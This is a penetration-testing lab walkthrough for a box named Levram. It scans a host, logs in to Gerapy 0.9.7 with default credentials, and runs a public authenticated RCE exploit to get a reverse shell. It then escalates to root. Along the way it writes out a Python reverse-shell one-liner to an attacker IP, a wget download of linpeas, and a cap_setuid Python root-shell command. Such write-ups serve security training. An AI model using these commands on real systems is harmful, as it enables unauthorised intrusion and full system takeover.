# Levram

## Initial access

Run `autorecon` to enumerate open ports and services:

```
sudo autorecon 192.168.112.24
```

Open ports discovered:

- **22** — SSH (OpenSSH 8.9p1 Ubuntu 3 (Ubuntu Linux; protocol 2.0))
- **8000** — HTTP
  - Additional webpages:
    - `http://192.168.112.24:8000/admin/login/?next=/admin/`
    - `http://192.168.112.24:8000/static/`
    - `http://192.168.112.24:8000/static/js/`
    - `http://192.168.112.24:8000/static/css/`
  - Nikto finding:
    ```
    + [000398] /SilverStream: SilverStream allows directory listing. See: https://web.archive.org/web/20011226154728/http://archives.neohapsis.com/archives/sf/pentest/2000-11/0147.html
    ```
    - `http://192.168.112.24:8000/SilverStream`

Run `nmap` with more detailed flags:

```
nmap -sVC -p- -v -T4 -sT --open 192.168.112.24
...
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.9p1 Ubuntu 3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 b9:bc:8f:01:3f:85:5d:f9:5c:d9:fb:b6:15:a0:1e:74 (ECDSA)
|_  256 53:d9:7f:3d:22:8a:fd:57:98:fe:6b:1a:4c:ac:79:67 (ED25519)
8000/tcp open  http    WSGIServer 0.2 (Python 3.10.6)
| http-methods:
|_  Supported Methods: GET OPTIONS
|_http-title: Gerapy
|_http-server-header: WSGIServer/0.2 CPython/3.10.6
|_http-cors: GET POST PUT DELETE OPTIONS PATCH
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Explore `http://192.168.112.24:8000` — redirects to `http://192.168.112.24:8000/#/login`. Able to log in with default credentials `admin:admin`.

Explore `http://192.168.112.24:8000/#/home` — the dashboard shows `Copyright © 2026 Gerapy v0.9.7 All Rights Reserved.`

Check for vulnerabilities in Gerapy:

```
searchsploit gerapy
----------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                     |  Path
----------------------------------------------------------------------------------- ---------------------------------
Gerapy 0.9.7 - Remote Code Execution (RCE) (Authenticated)                         | python/remote/50640.py
----------------------------------------------------------------------------------- ---------------------------------
```

Download the remote code execution exploit (CVE-2021-43857) and review it:

```
searchsploit -m 50640
...
#Get the project list
                print("[*] Getting the project list")
                r3 = r.get(url + "/api/project/index", headers=auth_token, allow_redirects=True)
                time.sleep(3)

                if (r3.status_code != 200):
                        print("[!] Something went wrong! Maybe the token is corrupted?")
                        quit();

                #Parse the project name for a request (yep, it's worse than earlier)
                dict = r3.text # [{'name': 'test'}]
```

The exploit requires an existing project to be present on the target.

Create a new project at `http://192.168.112.24:8000/#/project` with the name `test`. The Upload and Clone fields can be left empty.

Run the remote code execution script:

```
python3 50640.py -t 192.168.112.24 -p 8000 -L 192.168.45.189 -P 4443
...
Exploit for CVE-2021-43857
For: Gerapy < 0.9.8
[*] Resolving URL...
[*] Logging in to application...
[*] Login successful! Proceeding...
[*] Getting the project list
[{"name": "test"}]
[*] Found project: test
[*] Getting the ID of the project to build the URL
[*] Found ID of the project:  1
[*] Setting up a netcat listener
listening on [any] 4443 ...
[*] Executing reverse shell payload
[*] Watchout for shell! :)
connect to [192.168.45.189] from (UNKNOWN) [192.168.112.24] 35256
bash: cannot set terminal process group (846): Inappropriate ioctl for device
bash: no job control in this shell
app@ubuntu:~/gerapy$ whoami
whoami
app
```

Stabilize the shell with another reverse shell and catch with Penelope:

```
app@ubuntu:~/gerapy$ python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("192.168.45.189",4444));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("bash")'

# penelope
app@ubuntu:~/gerapy$ whoami
app
```

Get the `local.txt` flag:

```
app@ubuntu:~/gerapy$ find / -name local.txt 2>/dev/null
/home/app/local.txt

app@ubuntu:~/gerapy$ cat /home/app/local.txt
72f1cce6cb560c870b6850920376120d
```

## Privilege escalation

Upload `linpeas.sh` to the target. On the attacking machine, start a Python HTTP server:

```
# Host
python3 -m http.server 9001

ip a
inet 192.168.45.189/24

# Target
app@ubuntu:~/gerapy$ cd /tmp
app@ubuntu:~/gerapy$ which wget
/usr/bin/wget

app@ubuntu:~/gerapy$ wget http://192.168.45.189:9001/linux/enum/linpeas.sh
```

Run `linpeas.sh` to enumerate privilege escalation vectors:

```
app@ubuntu:/tmp$ chmod +x linpeas.sh
app@ubuntu:/tmp$ ./linpeas.sh
```

Important findings:

```
╔══════════╣ Kernel Exploit Registry (T1068)
CVE: CVE-2022-0847 | Name: DirtyPipe | Match data: pkg=linux-kernel,ver>=5.11,ver<5.15.25 | Tags: upstream-branch-candidate | Rank: 1 | Details: Upstream stable 5.15.25 fixes this branch; vendor backports and readable target-file prerequisites remain unverified
...
══╣ Polkit Binary (T1548.003,T1068)
Pkexec binary found at: /usr/bin/pkexec
Pkexec binary has SUID bit set!
-rwsr-xr-x 1 root root 30872 Feb 26  2022 /usr/bin/pkexec
pkexec version 0.105
CVE-2021-4034 candidate: root-owned SUID pkexec with older upstream version; verify distro package fixes and mitigations
...
Files with capabilities (limited to 50):
/usr/bin/python3.10 cap_setuid=ep
```

Both DirtyPipe (CVE-2022-0847) and pwnkit (CVE-2021-4034) were attempted but did not work.

The key finding is that `/usr/bin/python3.10` has the `cap_setuid=ep` capability, which allows any user to change their UID. Gain a privileged shell using [GTFOBins — Python](https://gtfobins.org/gtfobins/python/#shell):

```
app@ubuntu:/tmp$ /usr/bin/python3.10 -c 'import os; os.setuid(0); os.execl("/bin/sh", "sh")'
# whoami
root
```

Get the `proof.txt` flag:

```
# cd /root
# cat proof.txt
c4fdd6354c5978bf96a779169bfe403e
```
